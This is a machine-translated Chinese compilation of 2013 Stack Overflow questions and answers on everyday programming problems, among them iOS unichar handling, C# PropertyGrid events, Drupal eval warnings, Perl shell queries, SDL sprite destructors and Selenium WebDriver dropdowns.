# javascript - 用于实现蟋蟀类动画的 3D javascript 和 html 库

> ID：15110591
> 
> 赞同：1
> 
> 时间：2013-02-27T11:10:35.350
> 
> 标签：javascript, jquery, html, animation, 3d

我想在 html + javascript中创建类似于棒板球（[http://www.sticksports.com/game/stick-cricket/2-player-1-keyboard/ ）的动画。](http://www.sticksports.com/game/stick-cricket/2-player-1-keyboard/)你能帮忙看看什么样的库可用并且可以用来实现这一点。您能否根据我的要求推荐一些合适的库。非常感谢任何形式的帮助。

问候， Subhankar

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T13:57:04.493

你可以试试 tree.js

[http://mrdoob.github.com/three.js/](http://mrdoob.github.com/three.js/)

它使用 WebGL，在我看来是目前最好的 3D 库。

真诚的，

## 哈门布林克曼。

**更新**

我已经查看了您发布的链接，我很确定那是一个 Flash 游戏。如果是这样，那么它是用 Adob​​e Flash 制作的，并且几乎不能仅在 javascript 和 html 中实现。

# ios - 在 iOS 中允许特殊字符

> ID：15110593
> 
> 赞同：1
> 
> 时间：2013-02-27T11:10:40.123
> 
> 标签：ios, objective-c, special-characters

我允许用户在 TextField 中输入一些数据。用户输入`Š1234D`到 TextField。

我的代码如下所示：

```
NSString *string = textField.text;
for (int nCtr = 0; nCtr < [string length]; nCtr++) {
                const char chars = [string characterAtIndex:nCtr];
                int isAlpha = isalpha(chars);
} 
```

字符串输出如下所示：`Š1234D` 然后我打印了第一个 chars 值，它看起来像这样：'`' 而不是 'Š'。为什么会这样？我也想在我的代码中允许特殊字符。

任何建议也将受到欢迎。需要一些指导。谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-27T11:12:52.040

您将字符值截断为`[NSString chatacterAtIndex:]`返回`unichar`（16 位）而不是`char`（8 位）。尝试：

```
unichar chars = [string characterAtIndex:nCtr]; 
```

**更新**：还请注意，您不应该`isalpha()`用于测试字母，因为这仅限于拉丁字符集，并且您需要可以处理非拉丁字符的东西。请改用此代码：

```
NSCharacterSet *letterSet = [NSCharacterSet letterCharacterSet];
NSString *string = textField.text;
for (NSUIntger nCtr = 0; nCtr < [string length]; nCtr++)
{
    const unichar c = [string characterAtIndex:nCtr];
    BOOL isAlpha = [letterSet characterIsMember:c];
    ...
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-27T11:13:01.490

`characterAtIndex:`返回一个`unichar`（2 字节 Unicode 字符），而不是`char`（1 字节 ASCII 字符）。通过将其转换为`char`，您只会获得两个字节中的一个。

您应该打开编译器警告。我相信“可疑的隐式转换”应该可以解决问题。

在单独的说明中，您不能`isAlpha(char)`与`unichar`. 采用`[[NSCharacterSet letterCharacterSet] characterIsMember:chars]`

# c# - PropertyGrid 不会引发 PropertyValueChanged 事件

> ID：15110594
> 
> 赞同：1
> 
> 时间：2013-02-27T11:10:40.673
> 
> 标签：c#, propertygrid

当用户更改 PropertyGrid 中的文本或布尔值时，我`flagModified=true;`在事件处理程序中设置：

```
private void propertyGrid1_PropertyValueChanged(object s, PropertyValueChangedEventArgs e)
    {
        propertyGrid1.Refresh();
        PropertyChanged(true);
    } 
```

然后启用保存按钮。

我使用我的编辑器和表单（参见下面的类）来编辑 Properrtygrid 中的值之一。它是我班的对象。在编辑器中更改对象并关闭编辑器后，我将对象的值重新分配给新值（值 = frm.m_DS;）。一切正常，但有一刻：在这种情况下，PropertyValueChanged 没有被提升。我使用 PropertyValueChanged 事件来启用我的按钮“保存”，它将所有属性保存到文件中。如何捕获值更改的事件并启用“保存”按钮？

```
public class DataProviderEditor : UITypeEditor
    {

        public override Object EditValue(
          ITypeDescriptorContext context,
          IServiceProvider provider,
          Object value)
        {
            if ((context != null) && (provider != null))
            {
                IWindowsFormsEditorService svc =
                  (IWindowsFormsEditorService)
                  provider.GetService(typeof(IWindowsFormsEditorService));

                if (svc != null)
                {
                    using (DatasourceForm frm =
                      new DatasourceForm((MyDatasource)value))
                    {
                        if (svc.ShowDialog(frm) == DialogResult.OK)
                        {
                            value = frm.m_DS;
                        }
                    }
                }
            }

            return base.EditValue(context, provider, value);
        } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-27T11:58:38.917

我注意到有关该事件的文档`PropertyGrid.PropertyValueChanged`存在缺陷。它没有提到只有在用户更改值时才会引发事件。如果您查看[`PropertyValueChangedEventArgs`](http://msdn.microsoft.com/en-us/library/system.windows.forms.propertyvaluechangedeventargs%28v=vs.90%29.aspx)文档，您可以找到这一点，其中说：

> 当用户更改 PropertyGrid 中指定为 GridItem 的属性的值时，会发生 PropertyValueChanged 事件。

您可以做的是将`PropertyValueChanged`事件添加到由`PropertyGrid`. 您可以对其进行类似这样的编码：

```
public class BrowsedObject
{
    public event EventHandler PropertyValueChanged;

    private void OnPropertyValueChanged(object sender, EventArgs e)
    {
        EventHandler eh = PropertyValueChanged;
        if (eh != null)
            eh(sender, e);
    }

    private string someProperty;
    public new string SomeProperty
    {
        get { return someProperty; }
        set
        {
            someProperty = value;
            OnPropertyValueChanged(this, EventArgs.Empty);
        }
    }
} 
```

每次为`SomeProperty`对象分配一个新值时，都会 raise `PropertyValueChanged`。您可以连接到此事件逻辑，即启用“*保存”按钮*等。

**或者**

为什么不`PropertyChanged(true);`每次从代码中更改对象属性时调用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-02-20T09:15:36.230

对于一个非常简单的“自动更新”人员，您可以这样做：

```
propertyGrid1.SelectedObject = propertyGrid1.SelectedObject; 
```

它似乎奏效了，变化是可见的。

# php - 警告：php_eval()

> ID：15110596
> 
> 赞同：1
> 
> 时间：2013-02-27T11:10:49.283
> 
> 标签：php, drupal-7

我在我的 drupal 站点中添加了一些 php 代码。当我尝试运行它时，它会显示如下警告

“警告：有关 php_eval() 中的故障（/folderpath../modules/php/php.module 的第 80 行），请联系支持人员。”

在该 php.module 的第 80 行包含

```
ob_start();
print eval('?>' . $code);
$output = ob_get_contents();
ob_end_clean(); 
```

实际上这是一个发送邮件的php代码......

任何人都请帮助找出这个...

提前致谢

这是我为发送邮件编写的代码...

```
 $strTo = $_POST["txtTo"];
$strSubject = $_POST["txtSubject"];
$strMessage = nl2br($_POST["txtDescription"]);

//*** Uniqid Session ***//
$strSid = md5(uniqid(time()));

$strHeader = "";
$strHeader .= "From: ".$_POST["txtFormName"]."<".$_POST["txtFormEmail"].">\nReply-To: ".$_POST["txtFormEmail"]."";

$strHeader .= "MIME-Version: 1.0\n";
$strHeader .= "Content-Type: multipart/mixed; boundary=\"".$strSid."\"\n\n";
$strHeader .= "This is a multi-part message in MIME format.\n";

$strHeader .= "--".$strSid."\n";
$strHeader .= "Content-type: text/html; charset=utf-8\n";
$strHeader .= "Content-Transfer-Encoding: 7bit\n\n";
$strHeader .= $strMessage."\n\n";

//*** Attachment ***//
if($_FILES["fileAttach"]["name"] != "")
{
    $strFilesName = $_FILES["fileAttach"]["name"];
    $strContent = chunk_split(base64_encode(file_get_contents($_FILES["fileAttach"]["tmp_name"]))); 
    $strHeader .= "--".$strSid."\n";
    $strHeader .= "Content-Type: application/octet-stream; name=\"".$strFilesName."\"\n"; 
    $strHeader .= "Content-Transfer-Encoding: base64\n";
    $strHeader .= "Content-Disposition: attachment; filename=\"".$strFilesName."\"\n\n";
    $strHeader .= $strContent."\n\n";
}

$flgSend = @mail($strTo,$strSubject,null,$strHeader);  // @ = No Show Error //

if($flgSend)
{
    echo "Mail send completed.";
}
else
{
    echo "Cannot send mail.";
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T11:13:18.213

看起来您的主机不允许执行该`eval()`功能，这很常见，因为它可以在各种漏洞利用脚本中用于入侵服务器。他们可能不允许您使用它，因为它可能会危及整个服务器，您需要更改主机！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-13T10:46:06.217

更改主机不会解决问题，我的 Ubuntu 服务器允许 eval() 函数，但我在 Apache 日志中报告了相同的错误：

1.  这是 Apache 错误：PHP Parse error: syntax error, unexpected T_STRING in /home/websites/domainname/modules/php/php.module(80) : eval()'d code on line 3

2.php.module正在使用函数“php_eval：你可以在这里查看：http: [//api.drupal.org/api/drupal/modules%21php%21php.module/function/php_eval/7](http://api.drupal.org/api/drupal/modules%21php%21php.module/function/php_eval/7)

第 80 行是这样的： print eval('?>' . $code);

如果我删除 . $code 然后没有错误报告，所以我不认为它的 php 标签。网站没有故障，只是每个访问者的错误日志都在增长。

1.  您可以使用以下代码测试是否允许 eval() 函数并在您的服务器上运行：

进一步注意，我使用的是 GoVideo 主题，并且 eval 函数脚本在首页底部显示 3 个 url。这 3 个 URL 指向 Youtube、Flickr 和 facebook。您可以在此处查看它们（漫步到底部）。 [http://govideo.themesnap.net/](http://govideo.themesnap.net/)

说清楚；如果我删除 $code 变量，那么我会丢失首页上的 3 x Urls。

# php - behat预定义步骤

> ID：15110607
> 
> 赞同：0
> 
> 时间：2013-02-27T11:11:30.690
> 
> 标签：php, behat, phar

有没有人遇到以下问题：behat 显然工作正常，但它没有预定义的步骤：结果

```
\tests> php .\behat\behat.phar -di 
```

即使文件 FeatureContext.php 没有定义步骤，也是空的。我的behat版本是2.4.0，它是在PHAR的帮助下安装的，PHP版本是5.4.9。下面是我安装的一些细节。树形结构如下：

```
tests> dir
Directory: xxx\tests
Mode      Name                                       
d----     behat                                   
d----     features                                   
-a---     bootstrap.php                                   
-a---     phpunit.xml                                   
-a---     WebTestCase.php 
```

behat 文件夹包含以下文件：

```
tests> dir .\behat
Directory: xxx\tests\behat
Mode       Name
-a---     behat.phar                                   
-a---     mink.phar                                   
-a---     mink_extension.phar 
```

而功能文件夹只有引导目录

```
 tests> dir .\features
Directory: xxx\tests\features
    Mode     Name
    d----   bootstrap 
```

其中包含唯一具有以下内容的文件 FeatureContext.php

```
<?php

use Behat\Behat\Context\ClosuredContextInterface,
    Behat\Behat\Context\TranslatedContextInterface,
    Behat\Behat\Context\BehatContext,
    Behat\Behat\Exception\PendingException;
use Behat\Gherkin\Node\PyStringNode,
    Behat\Gherkin\Node\TableNode;

class FeatureContext extends BehatContext
{
    public function __construct(array $parameters)
    {
        // Initialize your context here
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-28T15:55:07.533

Behat 本身**没有**任何预定义的步骤。

我可以看到你下载了 mink 扩展，我猜你正在寻找它附带的步骤（它们在*MinkContext*中定义）。你没有粘贴你的*behat.yml*所以我不确定你是否真的启用了扩展。更多细节请关注[官方文档](http://extensions.behat.org/mink/index.html)。

*注意*：在*MinkContext*中定义的步骤是一个好的开始，但是一旦您完成了 Behat 的使用，您应该开始编写自己的步骤并使用您的业务领域的语言。默认*MinkContext*步骤几乎不会反映一个人的领域语言。

# linux - 如何在 perl 中实现 linux 查询？

> ID：15110611
> 
> 赞同：0
> 
> 时间：2013-02-27T11:11:37.903
> 
> 标签：linux, perl, awk

我在 linux 上使用以下查询来获取服务器负载：

```
w | head -n 1 | awk '{print $12}' 
```

现在我想通过 perl 脚本运行查询并在浏览器中打印输出。我怎么做？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-27T11:23:59.417

以下产生一个进程而不是四个：

```
open(my $pipe, '-|', 'w') or die $!;
my $line = <$pipe>;
close($pipe);
my $load = (split ' ', $line)[11]; 
```

*   `close($pipe)``w`关闭停止发送更多输出 的管道。
*   `split ' ', EXPR`在空白处拆分 EXPR。
*   `(EXPR)[11]`通过 EXPR 获得第 12 项返回。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-27T11:19:19.483

您可以简单地使用反引号捕获 shell 命令的输出：

```
chomp( my $load = `w | head -n 1 | awk '{print \$12}'` ); 
```

`$`必须转义，否则 Perl 将在发送命令之前尝试插入变量。

`system()`*如果您不需要*输出，是调用外部命令的首选方式。

但是，如果您编写的不仅仅是快速实用程序脚本，通常最好用等效的 Perl 代码替换系统命令。有许多模块可以复制常见 shell 命令和任务的功能。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-27T11:23:27.380

要在 perl 中运行系统命令，请参阅[此](http://www.perlhowto.com/executing_external_commands)。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-27T12:29:12.037

所需要的只是

```
my $load = (split ' ', `w`, 13)[11]; 
```

# c# - 使用 Event 应用 TellDontAsk 模式

> ID：15110614
> 
> 赞同：0
> 
> 时间：2013-02-27T11:11:45.737
> 
> 标签：c#, events, tell-dont-ask

我试图在 cSharp 中引发事件以通知我的应用程序中的代码更改，以便获得 tellDontAsk 场景。

我有从事件类实现的简单类

```
public class SimpleTellDontAsk : ISomeEvent
{
    public void doSomething(string text, EventHandlerArgs args)
    {
        Console.WriteLine("Email this message {0}", text);
        //sending message with email
        args.IsDo = true;
        RaiseEvent(this, args);
    }

    public event EventHandler RaiseEvent;
} 
```

我定义我的事件类如下

```
public interface ISomeEvent
{
    event EventHandler RaiseEvent;
}

public class SomeEvent : ISomeEvent
{
    public event EventHandler RaiseEvent;
}

public class EventHandlerArgs : EventArgs
{
    public bool IsDo { get; set; }
} 
```

我尝试将我的代码与 Nunit 测试一起使用

```
[TestFixture]
public class TestSimpleTellDontAsk
{
    [Test]
    public void Given_Text_When_doSomething_Then_ShouldPubliushArgs()
    {
        var tellDontAsk = new SimpleTellDontAsk();
        var senderEventHandlerArgs = new EventHandlerArgs();
        tellDontAsk.doSomething("test message", senderEventHandlerArgs);
        Assert.IsTrue(senderEventHandlerArgs.IsDo);
    }
} 
```

当我运行测试时，它会出现空引用异常

> System.NullReferenceException ：对象引用未设置为对象的实例。

我相信缺少某些东西，但无法弄清楚，有什么想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T11:16:54.593

未附加 RaiseEvent

```
 bool eventFired = false;

 var tellDontAsk = new SimpleTellDontAsk();
 tellDontAsk.RaiseEvent += (o, e) =>
            {
                if (e.IsDo)
                    eventFired = true;
            };
 tellDontAsk.doSomething("test message");
 Assert.IsTrue(eventFired); 
```

此外，如果您想使用自己的 EventArgs“EventHandlerArgs”，您应该选择通用 EventHandler。

eventargs 不应该在方法的参数中提供，它们应该在我们需要引发事件时创建。

```
public class SimpleTellDontAsk : ISomeEvent
{
    public void doSomething(string text)
    {
        Console.WriteLine("Email this message {0}", text);
        //sending message with email
        if (RaiseEvent != null) //Check if we have listeners
        {
            EventHandlerArgs args = new EventHandlerArgs();
            args.IsDo = true;
            RaiseEvent(this, args);
        }
    }
    public event EventHandler<EventHandlerArgs> RaiseEvent;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-27T11:13:40.530

RaiseEvent没有附加handler，修改了附加默认handler的代码，我还是不清楚它是如何实现的，告诉不问原则，你只是检查IsDo属性，ISomeEvent有什么用？

```
public interface ISomeEvent
{
    event Action<ISomeEvent, EventHandlerArgs> RaiseEvent;
}

public class SomeEvent : ISomeEvent
{
    public event Action<ISomeEvent, EventHandlerArgs> RaiseEvent;
}
public class EventHandlerArgs : EventArgs
{
    public bool IsDo { get; set; }
}

public class SimpleTellDontAsk : ISomeEvent
{
    public SimpleTellDontAsk()
    {
        RaiseEvent = (s,e) => { };
    }                                
    public void doSomething(string text, EventHandlerArgs args)
    {
        Console.WriteLine("Email this message {0}", text);
        //sending message with email
        args.IsDo = true;
        RaiseEvent(this, args);
    }

    public event Action<ISomeEvent, EventHandlerArgs> RaiseEvent;
} 
```

# ios - 如何使用 gdb 初始化可以在 ipad 主屏幕中看到的应用程序？

> ID：15110615
> 
> 赞同：1
> 
> 时间：2013-02-27T11:11:49.740
> 
> 标签：ios, gdb

我需要在初始化期间调试一个应用程序（我没有它的源代码）。使用

```
gdb AppName 
```

该应用程序似乎卡在 UIApplicationMain 中，并且从不调用属于应用程序代码的任何内容。但是，使用 gdb 附加主屏幕初始化过程，我们将错过所有初始化部分。

所以我的问题是，如何使用 gdb 启动可以在主屏幕中看到的应用程序，就像我们用手指启动它一样。

谢谢你。

# php - 删除 CodeIgniter 控制器名称 index.php 以仅显示默认控制器方法名称（带连字符）

> ID：15110618
> 
> 赞同：1
> 
> 时间：2013-02-27T11:12:07.793
> 
> 标签：php, codeigniter

我想

1.  从 URL 中删除默认控制器名称
2.  从 URL 中删除 index.php
3.  将带下划线的方法名转换为带连字符的方法名

在下面的示例中，fudev 是根目录下的子目录，而 preview 是 codeigniter 所在的目录。

目前：[http](http://devsite.com/fudev/preview/index.php/controllername/method_name) ://devsite.com/fudev/preview/index.php/controllername/method_name 。

我希望有：

[http://devsite.com/fudev/preview/method-name](http://devsite.com/fudev/preview/method-name)

有任何想法吗？我在 config/routes.php 中有以下内容将方法名称更改为连字符

```
$route['controllername/method-name'] = 'controllername/method_name'; 
```

..但这只有在我包含我想省略的控制器名称时才有用。

有任何想法吗？

提前致谢..

乔恩。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T12:07:33.623

您可以通过扩展 Router 类来更改 url 以接受连字符。
在 application/core 中创建一个名为 MY_Router.php 的文件（假设您没有更改在配置中设置的默认扩展前缀。

该文件的代码是；

```
<?php if (! defined('BASEPATH')) exit('No direct script access allowed');
class MY_Router extends CI_Router {

    function set_class($class) {
        $this->class = str_replace('-', '_', $class);
    }

    function set_method($method) {
        $this->method = str_replace('-', '_', $method);
    }

    function _validate_request($segments) {
        // Does the requested controller exist in the root folder?
        if (file_exists(APPPATH.'controllers/'.str_replace('-', '_', $segments[0]).'.php')) {
            return $segments;
        }
        // Is the controller in a sub-folder?
        if (is_dir(APPPATH.'controllers/'.$segments[0])) {       
            // Set the directory and remove it from the segment array
            $this->set_directory($segments[0]);
            $segments = array_slice($segments, 1);

            if (count($segments) > 0) {
                // Does the requested controller exist in the sub-folder?
                if ( ! file_exists(APPPATH.'controllers/'.$this->fetch_directory().str_replace('-', '_', $segments[0]).'.php')) {
                    show_404($this->fetch_directory().$segments[0]);
                }
            } else {
                $this->set_class($this->default_controller);
                $this->set_method('index');

                // Does the default controller exist in the sub-folder?
                if ( ! file_exists(APPPATH.'controllers/'.$this->fetch_directory().$this->default_controller.'.php')) {
                    $this->directory = '';
                    return array();
                }

            }

            return $segments;
        }

        // Can't find the requested controller...
        show_404($segments[0]);
    }
} 
```

这会将所有连字符重新映射为控制器的下划线，无需使用 htaccess。

# c++ - SDL 析构函数调用太早

> ID：15110623
> 
> 赞同：0
> 
> 时间：2013-02-27T11:12:15.573
> 
> 标签：c++, sdl

我正在 SDL 中编写基于图块的地图，并且`Map`该类的构造函数用于设置用于表示其中`MapCell`包含的每个对象的图像。但是，我的`Sprite`类的析构函数存在问题，该析构函数用于释放`SDL_Surface*`对象持有。析构函数被提前调用，我不完全确定为什么。这是我的构造函数的精简版本，`Map`仅显示了单元格的精灵是如何分配的。

```
Map::Map(string fileName, int tileWidth, int tileHeight)
{   
    string mapData = ReadMap(fileName);
    _cells = new MapCell[_width*_height];

    for(int y = 0; y < _height; y++)
    {
        for(int x = 0; x < _width; x++)
        {
            int currentCell = y*_width+x;

            if(mapData[currentCell] == '0' || mapData[currentCell] == 'P' || mapData[currentCell] == 'X')
            {
                _cells[currentCell]._sprite = Sprite(Point2D(x*tileWidth, y*tileHeight), "Assets/Graphics/Grass.bmp");
                if(mapData[currentCell] == 'P')
                    _cells[currentCell]._sprite = Sprite(Point2D(x*tileWidth, y*tileHeight), "Assets/Graphics/Player.bmp");
                if (mapData[currentCell] == 'X')
                    _cells[currentCell]._sprite = Sprite(Point2D(x*tileWidth, y*tileHeight), "Assets/Graphics/Target.bmp");
            }
            else if(mapData[currentCell] == '1')
                _cells[currentCell]._sprite = Sprite(Point2D(x*tileWidth, y*tileHeight), "Assets/Graphics/Wall.bmp");
        }
    }
} 
```

析构函数似乎在 Sprite 对象创建后立即被调用。我在这里想念什么？我也尝试在堆上分配`_sprite`成员`MapCell`，但这会导致同样的问题。据我所知，它并没有超出范围，因为`Sprite`创建的对象是对象的一部分`Map`。

以下是我的`Sprite`类的构造函数和析构函数：

```
Sprite::Sprite(void)
{
    _texture = NULL;
    _position = Point2D::Zero();
}

Sprite::Sprite(Point2D position, std::string texPath)
{
    _texture = Content::LoadBMP(texPath);
    _position = position;
}

Sprite::~Sprite(void)
{
    SDL_FreeSurface(_texture);
} 
```

如果它有帮助的话，这是我的主要内容：

```
int main( int argc, char* args[] )
{
    const int TILEWIDTH = 32;
    const int TILEHEIGHT = 32;

    // Initialization
    InitSDL();
    Map map = Map("Assets/Maps/Map3.txt", TILEWIDTH, TILEHEIGHT);
    Window::SetSize(Rectangle(0, 0, map.GetWidth()*TILEWIDTH, map.GetHeight()*TILEHEIGHT));

    PathFinder pathFinder = PathFinder();
    List<Point2D> path = pathFinder.FindPath(map, map.GetPlayerStart(), map.GetTarget());
    List<Sprite> PathNodes = List<Sprite>();
    for(int i = 0; i < path.GetCount(); i++)
        PathNodes.Add(Sprite(*path(i)*32, "Assets/Graphics/PathNode.bmp"));

    bool quit = false;
    SDL_Event Event;

    while(quit == false)
    {
        while(SDL_PollEvent(&Event))
        {
            if(Event.type == SDL_QUIT)
                quit = true;
        }

        map.Draw();

        for(int i = 0; i < path.GetCount(); i++)
        {
            if(PathNodes(i)->GetPosition() != map.GetPlayerStart()*32 && PathNodes(i)->GetPosition() != map.GetTarget()*32)
                PathNodes(i)->Blit();
        }

        Window::Flip();
    }

    //Quit SDL
    SDL_Quit();

    return 0;    
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-27T11:22:43.450

问题是作业`x._sprite = Sprite(...)`。这会创建一个`Sprite`临时文件，将其字段复制到`_sprite`中，然后*销毁临时*文件。此外，它不会*在*分配之前调用析构函数`_sprite`，所以旧的`_texture`只会泄漏。

如果您想避免这种情况，请使用`.set`or`.load`函数`Sprite`来更新`Sprite`而不是复制的内容，并创建*私有*分配和复制构造方法以避免意外滥用。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-27T11:24:15.487

```
for(int i = 0; i < path.GetCount(); i++)
        PathNodes.Add(Sprite(*path(i)*32, "Assets/Graphics/PathNode.bmp"));
                    // ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                    // a temporary here! 
```

当该表达式完成时，临时的析构函数`Sprite`被调用，释放表面并留下`PathNodes`带有指向已释放表面的悬空指针的对象。您的代码中可能还有更多这样的表达式。

遵守[三法则](https://stackoverflow.com/questions/4172722/what-is-the-rule-of-three)并为类编写适当的复制构造函数和赋值运算符`Sprite`。

请参阅[文档](http://sdl.beuc.net/sdl.wiki/SDL_Surface)以`SDL_Surface`了解需要做什么（您可能必须`refcount`手动增加表面成员）。

# jquery - Jquery - 在span标签和appen之间查找内容

> ID：15110624
> 
> 赞同：0
> 
> 时间：2013-02-27T11:12:27.243
> 
> 标签：jquery

我的跨度标签看起来像这样**`<span itemprop='description'>test123</span>`**我想要做的是读取标签之间的内容并在标签`<b>Copyright 2013</b>`之前添加一个`</span>`，所以它看起来像`<span itemprop='description'>test123<b>Copyright 2013</span>`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T11:15:09.023

```
$('span[itemprop="description"]').append("<b>Copyright 2013</b>"); 
```

这应该可以解决它，即使我不确定选择器是否正确

正如这里所建议的，这里是[文档的链接](http://api.jquery.com/append/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-27T11:16:15.567

使用`.append()`：

```
$(function(){
  $('span[itemprop="description"]').append('<b>Copyright 2013</b>');
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-27T11:18:55.380

```
$("span[itemprop='description']").append("<b>Copyright 2013</b>"); 
```

# statistics - 使用 lsqcurvefit 估计拟合参数的不确定性

> ID：15110625
> 
> 赞同：1
> 
> 时间：2013-02-27T11:12:28.563
> 
> 标签：statistics, matlab, curve-fitting, uncertainty

我正在使用`lsqcurvefit`这样的函数来拟合 a.*x.^b，它会给我 a ， b 和`resnorm`. 我想知道我怎么能对a和b有不确定性。是否可以像这样使用“雅可比”？

```
[x,resnorm,residual,exitflag,output,jacobian] = lsqcurvefit (...) 
```

那么我将有一个包含两列的数组，我认为这与这个事实有关，我有两个参数来拟合！但我不知道如何解释它或使用它们来估计 a 和 b 的误差。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-28T06:56:25.620

所以看起来这最好使用统计工具箱中的函数来实现。有关如何操作的示例，请参见[http://www.mathworks.com/support/solutions/en/data/1-18QY1/?solution=1-18QY1](http://www.mathworks.com/support/solutions/en/data/1-18QY1/?solution=1-18QY1)和此[http://www.mathworks.com/matlabcentral/answers/56734](http://www.mathworks.com/matlabcentral/answers/56734)获得拟合参数的标准偏差，但前提是您可以访问 Matlab 的统计工具箱。

如果您没有该工具箱，那么从关于[简单线性回归](http://en.wikipedia.org/wiki/Simple_linear_regression#Confidence_intervals)的维基百科文章中，您可以使用以下公式找到斜率参数的标准误差：

![在此处输入图像描述](../Images/2459d30db567a3832663bc7489b993f9.png)

大多数分子都存在`resnorm`，而分母很容易找到：

```
sum((X - mean(X)).^2) 
```

`X`用于查找拟合的所有输入自变量的向量在哪里

因此，您可以通过获取日志来将您的拟合转换为线性拟合，以便使用`Yln = log(Y)`并`Xln = log(X)`获得新模型：

```
Yln = b*ln(a) + b*Xln 
```

并使用简单线性回归参数的标准误差公式。

# php - 邮件 php 客户端看到我的代码

> ID：15110628
> 
> 赞同：0
> 
> 时间：2013-02-27T11:12:40.247
> 
> 标签：php, email, client

我按照本教程制作了一个 php 脚本以在 php 中发送电子邮件：

[教程](http://www.siteduzero.com/informatique/tutoriels/e-mail-envoyer-un-e-mail-en-php-1)

它有效，但并非总是如此。一些用户在他们的电子邮件中看到了我的 php 代码。

例如 ：

```
Content-Type: multipart/alternative;

 boundary="-----=2ba3f325bd1156f694ea4dbd4a2aee3f"

-------=2ba3f325bd1156f694ea4dbd4a2aee3f

Content-Type: text/plain; charset="ISO-8859-1"

Content-Transfer-Encoding: 8bit

Ceci est un test.

-------=2ba3f325bd1156f694ea4dbd4a2aee3f

Content-Type: text/html; charset="ISO-8859-1"

Content-Transfer-Encoding: 8bit

  <html>
   <head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
    <title>Demande de réinitialisation de mot de passe</title>
   </head>
   <body style="background-color:#f5f5f5;"> 
```

ETC..

预先感谢您的帮助 ：）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:21:33.317

不要直接使用邮件功能，而是使用 Swiftmailer [http://swiftmailer.org/之类的库](http://swiftmailer.org/)

让您可以更好地控制设置元数据、mime 类型等并避免陷阱。

# left-join - 在 HSQL 左外连接子句中使用 SUBSTR

> ID：15110631
> 
> 赞同：0
> 
> 时间：2013-02-27T11:12:48.017
> 
> 标签：left-join, hsqldb, outer-join

我需要使用 HSQL 执行以下查询（使用 ORACLE 可以正常工作）：

```
select t.name as sh_name,
         b.name as sh_bName
from PERSON t 
       left outer join TRANS tr on t.id=tr.tid
       left outer join AGREEM agr on tr.tripNumber=SUBSTR(agr.coll_external,1,4)
       left outer join PERSON b on (b.TYP='BROKER' and agr.broker_id = b.id)

where t.TYP='TRADER' 
```

我收到以下错误：`not allowed in OUTER JOIN condition in statement`。问题来自使用`SUBSTR`，没有它我不会收到任何错误。在 Oracle 中，上述语句工作得很好。

知道如何`SUBSTR`在 HSQL 的连接子句中使用吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T14:03:19.743

这是旧版本 HSQLDB 的限制。

较新的版本 2.x 允许在 OUTER JOIN 条件下使用 SUBSTR 或任何其他函数。

最新版本还支持兼容模式，以改进对 Oracle 数据类型和特性的处理。

# ruby - 使用 WebDriver 和 Ruby 与 JavaScript 下拉菜单交互？

> ID：15110632
> 
> 赞同：3
> 
> 时间：2013-02-27T11:12:51.643
> 
> 标签：ruby, firefox, selenium, automation, webdriver

我正在使用 Ruby 和 Selenium WebDriver 为网页编写自动化程序，但遇到了网站上使用 JavaScript 而不是标准 HTML 制作的一些下拉菜单的阻塞问题。在这些下拉列表中，用户可以从下拉列表中选择一个选项或单击它并开始输入它以根据输入的内容过滤结果（我假设这些下拉列表可能用于很长的列表选项）。

问题是我想不出一种使用 WebDriver 与它们交互的方法，尽管我已经设法使用下面的代码让它在 Selenium IDE 中工作，但是将此 IDE 脚本导出到 Ruby 不起作用：

```
<tr>
    <td>select</td>
    <td>css=select[name=dsref]</td>
    <td>demo</td>
</tr> 
```

我正在使用的 WebDriver 代码是：

```
def clickOn (parameters = {})
      # This will accept a locator type and name to click on
      #
      # EXAMPLE
      #
      # clickOn(
      #   locatorType: :link,
      #   locatorName: 'Home'
      # )
      #
      # This will click on the link named 'Home'
      locatorType = parameters[:locatorType]
      locatorName = parameters[:locatorName]
      $driver.find_element(locatorType, locatorName).click
    end

    clickOn(
          locatorType: :xpath,
          locatorName:     '/html/body/form/fieldset[4]/div[2]/div/div/div/a/span'
      ) 
```

然后，我尝试使用隐藏值字段的 xpath 以相同的方式从下拉列表中找到选择，但它无法找到隐藏值。

我试图与之交互的javascript是：

```
<div id="tabWarehousing" class="cansee">
<div class="lineFirst">
<div class="of8">
    <label for="formdsref">Warehouse</label>
    <br>
    <select id="sel2DZ" class="admn_dropdownmenu chzn-done" size="1" name="dsref"     style="display: none;">
        chosen=Chosen { form_field=select#sel2DZ.admn_dropdownmenu, options= {...}, active_field=

        true

        , more...}

        <option selected="" value=""></option>
        <option value="demo">demo</option>
        <option value="demodownload">demo download</option>
    </select>
    <div id="sel2DZ_chzn" class="chzn-container chzn-container-single chzn-container-single-  nosearch" style="width: 115px;">
        <a class="chzn-single" tabindex="-1" href="javascript:void(0)"> <span>demo</span>
        <div>
            <b></b>
        </div>
        </a>
        <div class="chzn-drop" style="left: -9000px; width: 113px; top: 18px;">
            <div class="chzn-search">
